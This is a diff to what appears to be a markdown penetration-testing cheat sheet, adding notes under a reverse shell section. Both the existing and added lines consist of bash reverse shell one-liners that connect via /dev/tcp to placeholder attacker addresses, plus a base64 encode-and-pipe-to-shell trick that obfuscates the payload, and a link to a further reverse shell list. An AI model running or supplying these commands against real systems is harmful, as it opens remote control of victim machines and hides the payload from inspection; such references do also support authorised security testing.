@@ -113,7 +113,10 @@
     - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
     - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
     - bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
-  
+  - Encode to base64 for oneliner + decode
+    - echo -n 'bash -c "bash -i >& /dev/tcp/ATTACKING_IP/ATTACKING_PORT 0>&1"' | base64
+    - echo base64encoded== | base64 -d | sh/bash
+  - Try different shels /bin/bash | sh
 - **Reverse shell**
   - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
